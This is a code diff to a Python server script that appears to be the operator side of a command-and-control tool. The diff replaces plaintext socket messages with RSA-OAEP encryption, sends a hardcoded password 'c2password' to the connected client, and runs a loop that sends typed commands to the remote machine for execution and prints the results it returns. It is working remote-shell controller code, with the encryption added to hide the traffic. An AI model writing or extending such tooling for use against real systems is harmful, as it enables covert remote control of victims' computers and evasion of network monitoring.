@@ -2,6 +2,9 @@
 
 import socket
 
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+
 import configuration as config  # Import configuration file
 
 # CONSTANTS & GLOBALS
@@ -24,11 +27,30 @@ print("Server now listening at on port %s" % (ADDRESS[1]))
 connection_socket, client_addr = server_socket.accept()
 print("Connected to %s on port %s" % (client_addr[0], client_addr[1]))
 
-# FOR DEBUGGING ONLY - change text to bytes (via encode) and send it over the connection
-message = "Test message!!!".encode()
-connection_socket.send(message)  # Need to add some asymmetric encryption
+# Create RSA key pair
+server_key = RSA.generate(config.KEY_SIZE)
+server_public_key = server_key.publickey()
+decrypt_cipher = PKCS1_OAEP.new(server_key)
 
-# TODO before sending in loop, check if we need to reconnect!!!
+# Send the server's public key
+connection_socket.send(server_public_key.exportKey())
+
+# Receive the client's public key
+client_public_key = RSA.importKey(connection_socket.recv(config.PAYLOAD_SIZE))
+encrypt_cipher = PKCS1_OAEP.new(client_public_key)
+
+def encrypt_and_send(message):
+    encrypted_message = encrypt_cipher.encrypt(message.encode())
+    connection_socket.send(encrypted_message)
+
+def receive_and_decrypt():
+    encrypted_message = connection_socket.recv(config.PAYLOAD_SIZE)
+    message = decrypt_cipher.decrypt(encrypted_message).decode()
+    return message
+
+# Send over the password for the client (only one client, o.w. we'd use diff passwords)
+password = "c2password"
+encrypt_and_send(password)
 
 # Server REPL loop - run the interactive shell
 while True:
@@ -38,13 +60,11 @@ while True:
     stripped_cmd = command.strip().lower()
     if stripped_cmd == "exit" or stripped_cmd == "hangup":
         # Tell the client to shut down, end server program
-        encrypted_exit = command.encode()
-        connection_socket.send(encrypted_exit)
+        encrypt_and_send(stripped_cmd)
         # TODO should I really end the server program? how to get back in touch, then?
         break
     # Execute the command on the remote machine (client)
-    encrypted_command = command.encode()
-    connection_socket.send(encrypted_command)
+    encrypt_and_send(command)
     # Print the results
-    decrypted_results = connection_socket.recv(config.PAYLOAD_SIZE).decode()
+    decrypted_results = receive_and_decrypt()
     print(decrypted_results)
